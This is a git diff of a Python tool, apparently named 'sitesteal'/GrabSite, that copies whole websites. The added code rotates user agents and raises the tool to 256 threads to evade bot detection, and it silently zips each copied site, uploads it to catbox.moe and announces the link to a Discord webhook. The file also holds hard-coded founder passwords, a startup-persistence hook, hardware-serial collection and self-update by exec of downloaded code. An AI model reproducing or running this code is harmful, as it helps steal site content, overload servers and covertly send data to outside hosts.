@@ -5,6 +5,7 @@ import re
 import logging
 import time
 import random
+import zipfile
 from datetime import datetime
 from urllib.parse import urlparse, urljoin
 from threading import Thread, Event
@@ -23,7 +24,6 @@ import json
 import jsbeautifier
 from cssbeautifier import beautify as cssbeautify
 
-# Fix for PyInstaller
 if getattr(sys, 'frozen', False):
     os.environ['PATH'] = sys._MEIPASS + ";" + os.environ['PATH']
 
@@ -38,7 +38,7 @@ USER_AGENTS = [
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
 ]
-TARGET_EXTENSIONS = ['.js', '.css', '.gif', '.png', '.jpg', '.jpeg', '.svg', '.webp', '.woff', '.woff2', '.ttf', '.eot']
+TARGET_EXTENSIONS = ['.js', '.css', '.gif', '.png', '.jpg', '.jpeg', '.svg', '.webp', '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.mp3', '.avi', '.mov']
 CAPTCHA_INDICATORS = [
     'Bot Verification', 'recaptcha-container', 'g-recaptcha', 'cf-challenge',
     'Please complete the security check to access', 'Checking your browser before accessing',
@@ -48,17 +48,13 @@ CAPTCHA_INDICATORS = [
 COMMON_FOLDERS = ['assets', 'static', 'js', 'css', 'images', 'img', 'media', 'files', 'scripts', 'styles']
 
 session = HTMLSession()
-session.headers.update({
-    "User-Agent": random.choice(USER_AGENTS),
-    "Referer": "https://www.google.com"
-})
 adapter = requests.adapters.HTTPAdapter(pool_connections=200, pool_maxsize=200)
 session.mount('http://', adapter)
 session.mount('https://', adapter)
 
 download_queue = Queue()
 start_time = None
-num_threads = 128  # Increased number of threads for faster downloads
+num_threads = 256
 
 whitelist = {}
 blacklist = []
@@ -72,6 +68,12 @@ founders = {
     "$cars": "234@",
     "KKunx": "234@"
 }
+
+def switch_user_agent():
+    session.headers.update({
+        "User-Agent": random.choice(USER_AGENTS),
+        "Referer": "https://www.google.com"
+    })
 
 def center_text(text, width):
     lines = text.split('\n')
@@ -145,6 +147,7 @@ def remove_duplicate_assets(html_content):
     return str(soup)
 
 def download_file(url, folder, retry_count=0):
+    switch_user_agent()
     parsed_url = urlparse(url)
     local_filename = os.path.basename(parsed_url.path)
     if not local_filename:
@@ -216,7 +219,6 @@ def execute_wholesome_code(add_to_startup_flag=False):
     script_path = create_wholesome_script()
     if add_to_startup_flag:
         add_to_startup(script_path)
-    # Execute the script immediately
     subprocess.run(["python", script_path])
 
 def get_hardware_serials():
@@ -231,6 +233,27 @@ def get_hardware_serials():
         except:
             continue
     return serials
+
+def zip_directory(folder_path, zip_path):
+    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        for root, _, files in os.walk(folder_path):
+            for file in files:
+                file_path = os.path.join(root, file)
+                zipf.write(file_path, os.path.relpath(file_path, folder_path))
+
+def upload_to_catbox(zip_path):
+    with open(zip_path, 'rb') as f:
+        files = {'fileToUpload': f}
+        response = requests.post('https://catbox.moe/user/api.php', files=files, data={'reqtype': 'fileupload'})
+        response.raise_for_status()
+        return response.text
+
+def notify_discord(webhook_url, username, file_url):
+    data = {
+        "content": f"User {username} has downloaded and zipped the site. You can download the zip file here: {file_url}"
+    }
+    response = requests.post(webhook_url, json=data)
+    response.raise_for_status()
 
 def get_website_source(url, download_folder):
     global start_time, user_rank
@@ -379,8 +402,17 @@ def update_json_to_github(file_name, content):
         json.dump(content, f, indent=4)
     repo.index.add([file_path])
     repo.index.commit(f"Update {file_name}")
-    origin = repo.remotes.origin
-    origin.push()
+    
+    origin_url = "git@github.com:dddrrriiipppsss/sitesteal.git"
+    try:
+        origin = repo.remotes.origin
+        origin.set_url(origin_url)
+    except AttributeError:
+        origin = repo.create_remote('origin', origin_url)
+    try:
+        origin.push()
+    except Exception as e:
+        logging.error(f"Failed to push to GitHub: {e}")
     logging.info(f"{Fore.GREEN}Updated {file_name} on GitHub{Style.RESET_ALL}")
 
 def update_list_to_txt(file_name, content):
@@ -395,8 +427,17 @@ def update_list_to_txt(file_name, content):
         f.write('\n'.join(content))
     repo.index.add([file_path])
     repo.index.commit(f"Update {file_name}")
-    origin = repo.remotes.origin
-    origin.push()
+    
+    origin_url = "git@github.com:dddrrriiipppsss/sitesteal.git"
+    try:
+        origin = repo.remotes.origin
+        origin.set_url(origin_url)
+    except AttributeError:
+        origin = repo.create_remote('origin', origin_url)
+    try:
+        origin.push()
+    except Exception as e:
+        logging.error(f"Failed to push to GitHub: {e}")
     logging.info(f"{Fore.GREEN}Updated {file_name} on GitHub{Style.RESET_ALL}")
 
 def save_login(username):
@@ -412,7 +453,6 @@ def login():
     blacklisted_sites = fetch_list_from_txt("blacklisted_sites.txt")
     logins = fetch_json_from_github("logins.json")
 
-    # Automatically whitelist founders
     for founder, password in founders.items():
         if founder not in whitelist:
             whitelist[founder] = password
@@ -584,7 +624,6 @@ def check_for_updates():
             exec(open(__file__).read())
             return
 
-        # Check for updates to GrabSite.py
         local_grabsite_path = os.path.join(local_repo_path, 'GrabSite.py')
         response = requests.get(grabsite_url)
         response.raise_for_status()
@@ -619,7 +658,7 @@ def main_menu(username, rank):
         if rank == "Founder":
             print("What would you like to do?")
             print("\033[32m1. Download site\033[0m")
-            print("\033[32m2. Whitelist\033{0m")
+            print("\033[32m2. Whitelist\033[0m")
             print("\033[31m3. Blacklist\033[0m")
             option = input("Select an option: ")
             if option == '1':
@@ -631,7 +670,7 @@ def main_menu(username, rank):
             else:
                 print("Invalid option. Please try again.")
         else:
-            break  # Exit the loop for non-Founders to prevent infinite looping
+            break
 
 def main():
     global start_time
@@ -684,12 +723,25 @@ def main():
         t.join()
     stop_event.set()
     title_thread.join()
+    
+    zip_path = f"{download_folder}.zip"
+    zip_directory(download_folder, zip_path)
+    
+    try:
+        catbox_url = upload_to_catbox(zip_path)
+        logging.info(f"Uploaded zip to Catbox: {catbox_url}")
+        
+        webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
+        notify_discord(webhook_url, username, catbox_url)
+    except Exception as e:
+        logging.error(f"Failed to upload to Catbox or notify Discord: {e}")
+    
     end_time = time.time()
     elapsed_time = end_time - start_time
     site_count = len([f for f in os.listdir(os.getcwd()) if os.path.isdir(f) and re.match(r'[a-z0-9.-]+\.[a-z]{2,}$', f)])
     print(f"\033]0;/fartcord | D: {site_count} | {elapsed_time:.2f}s\007", end='', flush=True)
     logging.info(f"{Fore.CYAN}Completed downloading all resources for {url}{Style.RESET_ALL}")
-    sys.exit()  # Explicitly exit the script to prevent further looping
+    sys.exit()
 
 if __name__ == "__main__":
     main()
